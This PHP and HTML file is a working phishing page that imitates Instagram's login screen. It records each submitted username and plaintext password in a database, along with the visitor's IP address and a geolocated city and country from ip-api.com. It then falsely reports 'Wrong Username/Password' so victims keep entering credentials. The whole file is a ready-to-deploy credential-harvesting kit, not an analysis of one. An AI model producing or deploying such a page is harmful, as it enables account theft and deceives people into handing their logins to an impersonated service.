<?php
// Start the session
session_start();

// Database connection
require_once "connect.php";

// Function to get user's IP address
function getUserIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // Use the first IP from the list
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Function to get country based on IP address using ip-api.com
// Function to get location (city and country) based on IP address using ip-api.com
function getLocationByIp($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url); // Suppress warnings
    
    if ($response === false) {
        return ['country' => 'Unknown', 'city' => 'Unknown']; // Fallback if API fails
    }
    
    $response = json_decode($response, true);
    
    if (isset($response['status']) && $response['status'] === 'fail') {
        return ['country' => 'Unknown', 'city' => 'Unknown']; // Fallback if IP lookup fails
    }
    
    return [
        'country' => $response['country'] ?? 'Unknown',
        'city'    => $response['city'] ?? 'Unknown'
    ];
}


if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Capture form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Get the actual user's IP address
    $ip_address = getUserIpAddr();

    // Get location details based on user's IP
    $location = getLocationByIp($ip_address);
    $country = $location['country'];
    $city = $location['city'];

    // Store user login details into the database
    $stmt = $conn->prepare("INSERT INTO users (username, password, ip, country, city) VALUES (?, ?, ?, ?, ?)");
    
    if ($stmt === false) {
        die('MySQL prepare error: ' . htmlspecialchars($conn->error));
    }

    // Bind parameters and execute
    $stmt->bind_param("sssss", $username, $password, $ip_address, $country, $city);

    if ($stmt->execute()) {
        $_SESSION['success_message'] = "Wrong Username/Password";
    } else {
        $_SESSION['error_message'] = "Failed to log user details: " . htmlspecialchars($stmt->error);
    }

    $stmt->close();
    $conn->close();

    // Redirect back to the login page
    header("Location: index.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="main.css">
    <title>Login</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: 'Arial', sans-serif;
        }

        .login-container {
            max-width: 350px;
            margin: 15px auto;
            padding: 15px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
            text-align: center;
        }

        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            background-color: #fafafa;
        }

        .login-button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            padding: 10px;
            width: 100%;
            margin-top: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
        }

        .login-button:hover {
            background-color: #0077cc;
        }

        .forgot-password {
            font-size: 12px;
            margin-top: 15px;
            color: #385185;
            cursor: pointer;
        }

        .message {
            color: green; /* Change this to red if you want to show error messages */
            margin-top: 10px;
        }

        .or-divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or-divider::before {
            margin-right: 10px;
        }

        .or-divider::after {
            margin-left: 10px;
        }

        .signup-container {
            margin-top: 20px;
            padding: 10px;
            text-align: center;
            background-color: #fff;
        }

        .signup-container a {
            text-decoration: none;
            color: #0095f6;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <center><img src="images/1024px-Instagram_logo.svg.png" alt="Instagram Logo"></center>
        
        <form action="index.php" method="POST">
            <input type="text" class="input-field" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" class="input-field" name="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        
        <div class="forgot-password">Forgot password?</div>

        <!-- Display success or error message -->
        <?php if (isset($_SESSION['success_message'])): ?>
            <div class="message" style="color: red;"><?php echo $_SESSION['success_message']; unset($_SESSION['success_message']); ?></div>
        <?php elseif (isset($_SESSION['error_message'])): ?>
            <div class="message" style="color: red;"><?php echo $_SESSION['error_message']; unset($_SESSION['error_message']); ?></div>
        <?php endif; ?>

        <div class="signup-container">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
<div class="app">
                            
                            <p>Get the app.</p>
                            <div class="app-img">
                                <a
                                    href="">
                                    <img
                                        src="images/ios.png" alt="IOS" style="height: 50px;">
                                </a>
                                <a
                                    href="">
                                    <img
                                        src="images/google.png" alt="Play Store" style="height: 40px; margin-top: 5px;">
                                </a>
                            </div> <!-- App-img end-->
                        </div> <!-- App end -->
                    </div> <!-- Content end -->
                </article>
            </div> <!-- Wrapper end -->
        </main>

        <!-- 2-Role Footer -->
        <footer class="footer" role="contentinfo">
            <div class="footer-container">

                <nav class="footer-nav" role="navigation">
                    <ul>
                        <li><a href="">About Us</a></li>
                        <li><a href="">Support</a></li>
                        <li><a href="">Blog</a></li>
                        <li><a href="">Press</a></li>
                        <li><a href="">Api</a></li>
                        <li><a href="">Jobs</a></li>
                        <li><a href="">Privacy</a></li>
                        <li><a href="">Terms</a></li>
                        <li><a href="">Directory</a></li>
                        <li>
                            <span class="language">Language
                                <select name="language" class="select" onchange="la(this.value)">
                                    <option value="#">English</option>
                                    <option value="">Russian</option>
                                </select>
                            </span>
                        </li>
                    </ul>
                </nav>

            </div> <!-- Footer container end -->
        </footer>

    </section>
    </span> <!-- Root -->
    </div>
</body>
</html>
